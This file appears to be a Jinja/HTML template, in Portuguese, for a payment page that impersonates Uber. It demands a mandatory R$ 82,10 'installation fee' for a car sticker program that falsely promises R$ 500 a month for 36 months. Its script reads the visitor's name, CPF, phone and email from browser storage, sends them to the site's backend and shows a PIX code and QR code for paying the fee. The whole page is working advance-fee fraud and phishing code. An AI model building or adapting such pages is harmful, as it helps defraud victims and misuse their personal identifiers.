{% extends "layout.html" %}

{% block title %}Pagamento do Adesivo Uber{% endblock %}

{% block content %}
<div class="container mx-auto px-4 py-6 max-w-6xl">
    <!-- Header -->
    <div class="text-center">
        <!-- Alert Icon -->
        <div class="mb-4">
            <img src="https://cdn-icons-png.flaticon.com/512/5610/5610989.png" alt="Alerta" class="mx-auto w-16 h-16 mb-4">
        </div>
        
        <div class="mb-4">
            <h1 class="text-3xl md:text-5xl font-bold text-gray-800 leading-tight">Taxa de Instalação do Adesivo</h1>
        </div>
        
        <div class="bg-gray-100 p-6 md:p-10 mb-4 text-center" style="border-radius: 0px !important;">
            <p class="text-gray-800 text-base md:text-xl font-medium leading-relaxed mb-6">
                <strong>ATENÇÃO:</strong> O pagamento da Taxa de Instalação no valor de <strong>R$ 82,10</strong> é obrigatório para participar do programa.
            </p>
            
            <!-- Imagem dentro da box -->
            <img src="https://i.ibb.co/wNmGb11S/assets-task-01jyhvmxk2ea7an1jzt95pfapt-1750798711-img-0.webp" alt="Programa Uber" class="mx-auto max-w-full h-auto rounded-lg">
        </div>
    </div>

    <!-- Instalação Information -->
    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
        <h2 class="text-xl font-bold mb-4 text-gray-800">Instalação Obrigatória por Funcionário Autorizado</h2>
        
        <div class="bg-white border border-gray-200 p-4 mb-4" style="border-radius: 0px !important;">
            <p class="text-gray-700 text-sm leading-relaxed mb-3">
                O adesivo do programa deve ser instalado exclusivamente por um <strong>funcionário autorizado da Uber</strong>. Este profissional será responsável por:
            </p>
            <ul class="text-gray-700 text-sm space-y-2 ml-4">
                <li>• Instalar o adesivo na posição correta do veículo</li>
                <li>• Tirar foto oficial do adesivo instalado</li>
                <li>• Validar a instalação no sistema Uber</li>
            </ul>
        </div>
        
        <div class="bg-gray-100 p-4 mb-4" style="border-radius: 0px !important;">
            <h3 class="font-semibold text-gray-800 mb-2">Importante</h3>
            <p class="text-gray-700 text-sm leading-relaxed">
                <strong>Sem o pagamento desta Taxa de Instalação, você não participará do programa e não receberá os pagamentos mensais de R$ 500,00 por 3 anos.</strong>
            </p>
        </div>
        
        <div class="bg-white border border-gray-200 p-4" style="border-radius: 0px !important;">
            <h3 class="font-semibold text-gray-800 mb-2">Benefícios do Programa</h3>
            <p class="text-gray-700 text-sm leading-relaxed">
                Com o pagamento confirmado, você receberá <strong>R$ 500,00 mensais por 36 meses</strong>, totalizando <strong>R$ 18.000,00</strong> durante a participação no programa.
            </p>
        </div>
    </div>

    <!-- Payment Summary -->
    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
        <h2 class="text-xl font-bold mb-4 text-gray-800">Resumo do Pagamento</h2>
        
        <div class="space-y-3">
            <div class="flex justify-between items-center border-b pb-2">
                <span class="text-gray-600">Taxa de Instalação:</span>
                <span class="font-medium">R$ 82,10</span>
            </div>
            <div class="flex justify-between items-center border-b pb-2">
                <span class="text-gray-600">Instalação Autorizada:</span>
                <span class="font-medium">Incluído</span>
            </div>
            <div class="flex justify-between items-center border-b pb-2">
                <span class="text-gray-600">Foto Oficial:</span>
                <span class="font-medium">Incluído</span>
            </div>
            <div class="flex justify-between items-center text-lg font-bold text-black bg-gray-100 p-3" style="border-radius: 0px !important;">
                <span>Total a Pagar:</span>
                <span>R$ 82,10</span>
            </div>
        </div>
    </div>

    <!-- Payment Section -->
    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
        <!-- Alert Icon -->
        <div class="text-center mb-4">
            <img src="https://icones.pro/wp-content/uploads/2021/05/symbole-d-avertissement-jaune.png" alt="Alerta" class="mx-auto w-16 h-16">
        </div>
        
        <!-- Status Box -->
        <div class="bg-yellow-50 border border-yellow-200 p-4 mb-4 text-center" style="border-radius: 0px !important;">
            <!-- Animated Spinner -->
            <div class="inline-block mb-3" style="width: 32px; height: 32px; border: 3px solid #fbbf24; border-top: 3px solid #d97706; border-radius: 50%; animation: spin 1s linear infinite;"></div>
            <p class="text-yellow-800 font-medium">Aguardando pagamento da Taxa de instalação...</p>
        </div>
        
        <div class="bg-gray-50 border p-4 mb-4" style="border-radius: 0px !important;">
            <!-- Loading Message -->
            <div id="loadingMessage" class="text-center text-gray-600 py-4">
                Gerando pagamento PIX...
            </div>
            
            <!-- PIX QR Code -->
            <div class="text-center mb-4">
                <img id="pixQrCode" style="display: none;" class="mx-auto border shadow-sm" width="180" height="180" style="border-radius: 0px !important;">
            </div>
            
            <!-- PIX Code Section -->
            <div id="pixCodeSection" style="display: none;" class="mb-4">
                <label class="block text-sm font-medium text-gray-700 mb-2">Código PIX (Copia e Cola):</label>
                <input 
                    type="text" 
                    id="pixCode" 
                    readonly 
                    class="w-full border border-gray-300 px-3 py-2 bg-white text-xs mb-3"
                    style="border-radius: 0px !important;"
                    placeholder="Código PIX será gerado automaticamente..."
                >
                <button 
                    onclick="copyPixCode()" 
                    class="w-full bg-green-600 hover:bg-green-700 text-white px-4 py-2 text-sm font-medium"
                    style="border-radius: 0px !important;"
                    id="copyButton"
                >
                    Copiar
                </button>
            </div>
            
        </div>
        
    </div>
</div>

<style>
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
</style>

<script>
// Auto-generate PIX payment on page load
document.addEventListener('DOMContentLoaded', async function() {
    try {
        // Get user data from localStorage - check all possible sources
        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
        const paymentData = JSON.parse(localStorage.getItem('cnvPaymentData') || '{}');
        
        // Try multiple localStorage keys for user data
        const userName = (
            paymentData.name || 
            userData.full_name || 
            userData.name || 
            localStorage.getItem('candidateName') || 
            localStorage.getItem('userName') || 
            ''
        );
        
        const userCPF = (
            paymentData.cpf || 
            userData.cpf || 
            localStorage.getItem('candidateCPF') || 
            localStorage.getItem('userCPF') || 
            ''
        );
        
        const userPhone = (
            paymentData.phone || 
            userData.phone || 
            localStorage.getItem('candidatePhone') || 
            localStorage.getItem('userPhone') || 
            ''
        );
        
        const userEmail = (
            paymentData.email || 
            userData.email || 
            localStorage.getItem('candidateEmail') || 
            localStorage.getItem('userEmail') || 
            ''
        );
        
        console.log('Extracted user data:', { name: userName, cpf: userCPF, phone: userPhone, email: userEmail });
        
        // Debug localStorage contents
        console.log('All localStorage keys:', Object.keys(localStorage));
        for (let key in localStorage) {
            console.log(`localStorage.${key}:`, localStorage.getItem(key));
        }
        
        if (userName && userCPF) {
            const payloadData = {
                name: userName,
                cpf: userCPF,
                email: userEmail,
                phone: userPhone
            };
            
            console.log('Sending payload:', payloadData);
            
            // Create payment using existing endpoint
            const response = await fetch('/create_cnv_payment', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payloadData)
            });
            
            const result = await response.json();
            console.log('API Response:', result);
            
            if (result.success && result.payment_data) {
                const pixData = result.payment_data;
                console.log('PIX Data:', pixData);
                
                // Display real PIX code
                if (pixData.pixCopyPaste) {
                    document.getElementById('pixCode').value = pixData.pixCopyPaste;
                    document.getElementById('pixCodeSection').style.display = 'block';
                    console.log('PIX code set successfully');
                }
                
                // Display real QR Code
                if (pixData.pixQrCode) {
                    const qrCodeElement = document.getElementById('pixQrCode');
                    qrCodeElement.src = pixData.pixQrCode;
                    qrCodeElement.style.display = 'block';
                    console.log('QR Code displayed successfully');
                }
                
                // Store payment ID for status checking
                if (pixData.paymentId) {
                    localStorage.setItem('cnvPaymentId', pixData.paymentId);
                    console.log('Payment ID stored:', pixData.paymentId);
                }
                
                // Hide loading message
                document.getElementById('loadingMessage').style.display = 'none';
                
            } else {
                throw new Error(result.error || 'Erro ao criar pagamento PIX');
            }
        } else {
            console.error('Dados do usuário incompletos:', { name: userName, cpf: userCPF, phone: userPhone });
            document.getElementById('loadingMessage').innerHTML = `
                <div class="text-red-600">
                    Dados do usuário não encontrados no localStorage.<br>
                    Nome: ${userName || 'não encontrado'}<br>
                    CPF: ${userCPF || 'não encontrado'}<br>
                    <a href="/" class="text-blue-600 underline">Voltar ao início</a>
                </div>
            `;
        }
    } catch (error) {
        console.error('Erro ao criar pagamento:', error);
        document.getElementById('loadingMessage').innerHTML = `
            <div class="text-red-600">
                Erro ao carregar dados de pagamento: ${error.message}<br>
                <a href="/" class="text-blue-600 underline">Voltar ao início</a>
            </div>
        `;
    }
});

// Copy PIX code function
function copyPixCode() {
    const pixCodeInput = document.getElementById('pixCode');
    pixCodeInput.select();
    pixCodeInput.setSelectionRange(0, 99999);
    
    try {
        document.execCommand('copy');
        
        const button = event.target.closest('button');
        const originalText = button.textContent;
        button.textContent = 'Copiado!';
        button.classList.add('bg-green-600');
        
        setTimeout(() => {
            button.textContent = originalText;
            button.classList.remove('bg-green-600');
        }, 2000);
        
    } catch (err) {
        alert('Erro ao copiar código PIX');
    }
}
</script>
{% endblock %}